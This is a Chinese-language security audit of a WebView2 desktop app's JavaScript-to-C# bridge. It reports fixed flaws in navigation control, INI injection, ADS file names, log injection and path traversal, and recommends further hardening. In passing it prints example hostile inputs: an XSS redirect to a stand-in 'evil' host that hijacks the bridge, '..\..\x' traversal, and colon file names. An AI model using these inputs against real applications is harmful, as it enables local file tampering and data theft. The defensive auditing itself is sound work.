# 安全审计报告（2026-10-20）

> 审计对象：FileStampWatermark `main` @ `2d50170`
> 审计面：本地桌面应用（WPF + WebView2），但**内嵌了一个可调用本地能力的 JS 桥**，
> 攻击模型与普通网页应用不同：没有「远程用户」，但**任何能影响页面内容的输入**（含用户拖入的文件名、
> 页面内文本、外部链接、共享机器上的同用户进程）都可能成为入口。
> 结论：**高风险 → 本轮加固后为中低风险**；已修 8 项，剩余 5 项列为建议。

---

## 一、攻击面

```
                 ┌──────────────────────────────────────────┐
 用户拖入文件 ──►│ WebView2  页面 (https://app/index.html)   │
 智能体 CLI   ──►│   ↕ window.CSharpBridge（宿主对象注入）  │──► 本地能力：
 外部链接     ──►│   ↕ window.chrome.webview（事件通道）     │    · 读写任意本地文件
                 └──────────────────────────────────────────┘    · 启动进程（explorer）
                                                                · 写 config.ini
```

关键点：C# 桥是 `AddHostObjectToScript` 注入的**宿主对象**，它
1. 在顶层文档与**所有子 frame** 都可用；
2. **不随页面导航到新 origin 自动收回**；
3. **没有 origin 绑定**——WebView2 不提供「只给某个 origin 发宿主对象」的能力，需要应用自己做导航管控。

因此本项目最关键的一条安全边界是：**页面永远不能被导航到外部站点**。

---

## 二、已修复项

### S-1【严重】WebView2 零来源校验 → 已修

**问题**：`grep -rn "WebMessageReceived|NavigationStarting|NewWindowRequested|CoreWebView2Settings" WebShell/` **零命中**。
既无导航白名单，也无任何 `CoreWebView2Settings` 配置（DevTools / 右键菜单 / 状态栏 / 脚本弹窗全部默认开启）。

**攻击路径**：`index.html:1377` 有 `target="_blank"` 的外链（GitHub / Gitee），而 `NewWindowRequested` 未处理。
一旦该窗口在 WebView2 内部打开，外部页面即拥有完整宿主对象；
即便外链走系统浏览器，页面内任何 XSS 都可以 `location='https://evil/'` 导航过去后继续调用桥。

**修复**（`WebShell/MainWindow.xaml.cs`）：
- `NavigationStarting`：只放行 `https://app/`、`https://cache/`、`about:blank`、`data:`，其余**取消导航**并交给系统浏览器；
- `NewWindowRequested`：`Handled = true` + 系统浏览器打开（宿主对象绝不进入任何新文档）；
- `Settings`：`AreDevToolsEnabled=false`（控制台可直接调桥）、`AreDefaultContextMenusEnabled=false`、
  `IsStatusBarEnabled=false`、`AreDefaultScriptDialogsEnabled=false`；
  `IsWebMessageEnabled` **保持 true**（壳层事件推送依赖此通道）。

### S-2【严重】config.ini 结构污染（配置注入）→ 已修

`AppConfig.StampParamSection(name)` = `"stamp_" + name`，**不过滤任何字符**，而 `name` 来自前端
（`SetStampParams` / `RenameStamp`），最终作为 **INI 节名**写入 `config.ini`。
含 `]` 或 CR/LF 的名字会写出畸形节结构，可污染任意节（改 `outputDir`、改印章尺寸等）。

**修复**：`StampParamSection` 统一清洗 `= ; [ ] CR LF NUL` 并限长 60（与 `WatermarkSchemeStore.SanitizeName` 同一套规则）；
`RenameStamp` 同步补校验 `] [ CR LF`；新增 `AppConfig.SanitizeStampDisplayName` 供所有「显示名来自文件名/用户输入」的入口使用。

### S-3【高】拖入文件名 → NTFS 备用数据流（ADS）→ 已修

`Path.GetFileName` 去掉目录部分，但**未剔除 `:`**：`报表.txt:副本.pdf` 会被写成 `报表.txt` 的隐藏 ADS 流——
文件在资源管理器里看不到、常规删除也删不掉。

**修复**：新增 `CSharpBridge.SanitizeDroppedFileName`，按 `Path.GetInvalidFileNameChars()` 全量过滤 + 限长 100。

### S-4【高】日志注入 → 已修

`AppLog.Write` 直接把前端可传的任意字符串写入日志文件（`LogLine` 是开放写入接口）：
用 `\r\n` 可伪造 `===== 上次运行 xxx =====` 分段（把别的运行记录伪装成本次），控制字符可干扰阅读，单行长度无上限。

**修复**：控制字符（含 CR/LF）统一转空格 + 单行限长 2000 字符（`AppLog.Write`）。

### S-5【中】临时目录长期残留用户文档内容 → 已修

`%TEMP%\pdfqfz_web_preview_<pid>`、`pdfqfz_drop_<pid>`、`pdfqfz_imgdrop_<pid>` 每次启动新建一个、
**旧目录从不清理**：里面是用户合同的整页渲染图与拖入文件的原文，同机其它进程可读，磁盘也持续累积。

**修复**：启动时按 pid 判活清理历史目录（进程仍在运行的跳过，多开安全）。

### S-6【中】输出目录/文件名可被前端任意指定 → 已修（部分）

- 输出命名标记不洗非法字符 → 填 `..\..\x` **产物写出输出目录**（B-12，已修）。
- `OutputFileNamingPolicy` 的同名保护只比对源文件，`GetNextOutputPath` 与实际写盘之间存在 TOCTOU → 并行批次同名覆盖（B-13，已修：独占创建 + 撞名重算 + 本批次占位名）。

**仍存**：桥方法本身仍允许前端指定任意 `outDir`（本地应用场景下等价于「用户自己选目录」，暂按可接受处理）。

### S-7【中】印章库列表被 `;` 破坏 → 已修

显示名含 `;`（文件名 `a;b.png`）写入 `stampPaths`（`name|path` 以 `;` 分隔）后，
读回时整条列表被拆坏——**其余印章全部丢失/错位**。已在写入前清洗、读回时做容错合并。

### S-8【中】并发字典 / 列表竞态 → 已修

- `_fpSizeCache`：`Dictionary` 无锁读 + 加锁写（并发取章时可能读到脏数据）。
- `AppConfig.LastSelectedStampNames`：UI 线程 `Clear()+Add()` 与后台批量线程 `Count>0 → [0]` 竞态
  → 抛 `ArgumentOutOfRangeException`，表现为「批量预览随机失败」。已统一加锁。

---

## 三、未修复项与理由

| # | 级别 | 问题 | 理由 / 建议方案 |
|---|------|------|----------------|
| U-1 | 中 | 页面无 Content-Security-Policy | 本机无法实机验证 WebView2 的 CSP 行为，**写错即白屏**。建议实测后加：<br>`<meta http-equiv="Content-Security-Policy" content="default-src 'self' https://cache data: blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://cache; connect-src 'self' data: blob:; frame-src 'none'; object-src 'none'; base-uri 'none'">`<br>（`'unsafe-eval'` 是必需的：项目用 vue.global.prod.js 全量构建，模板编译器需要 `new Function`） |
| U-2 | 中 | `MainWindow.xaml.cs` 约 2000 行 E2E/自检代码由环境变量 `PDFQFZ_SHELL_DUMP` 触发，含任意路径读写与 `Environment.Exit` | 建议迁到 `#if DEBUG` 或独立测试工程；迁移前注意 E2E 流程依赖发布版 EXE |
| U-3 | ~~中~~ | ~~`activation.dat` 硬件指纹仅 `XOR 0x5A + Base64`；`catch { return true; }` 异常一律放行；记录数 <2 自动把本机加进去~~ | **已作废**：赞助版档位已于 v1.1.1.12 整体下线，授权/指纹机制连同 `vip.ini` 一并删除，风险面不复存在（U-1~U-5 之外的「设备标识信息明文可还原」也随之消失） |
| U-4 | 低 | `GetAppPath` / `GetIniPath` / `GetStampList` 会把 EXE 目录、config.ini 绝对路径、印章库路径暴露给页面 | 属信息泄露（辅助后续攻击），建议改为只返回文件名/相对路径；当前无直接可利用链 |
| U-5 | 低 | `OpenFolder` 用 `explorer.exe` + 拼接参数（前端可控） | 已有 `Directory.Exists`/`File.Exists` 前置校验，且 Windows 文件名不允许含 `"`，**当前不可参数注入**；建议改为 `ProcessStartInfo{FileName=路径, UseShellExecute=true}` 直接打开 |

---

## 四、加固后的安全基线（建议写进开发规约）

1. **页面永不导航到外部站点**——新增外链一律走 `NewWindowRequested` + 系统浏览器（已落地）。
2. **桥方法白名单**——目前是把整个 `CSharpBridge` 类挂上去；建议后续拆一个只暴露必要方法的 façade，
   `GetAppPath` / `GetIniPath` / `EscapeJson` 等内部方法不进 façade。
3. **前端输入一律当不可信**——路径、文件名、显示名、命名标记都必须在 C# 侧清洗（本轮已覆盖主要入口）。
4. **文件写入不进用户配置**——智能体批处理不得改 `config.ini`（本轮已改为内存覆盖）。
5. **门禁要有反向检查**——「前端调了 C# 没有的方法」这一类必须由 CI 拦住（本轮已补）。
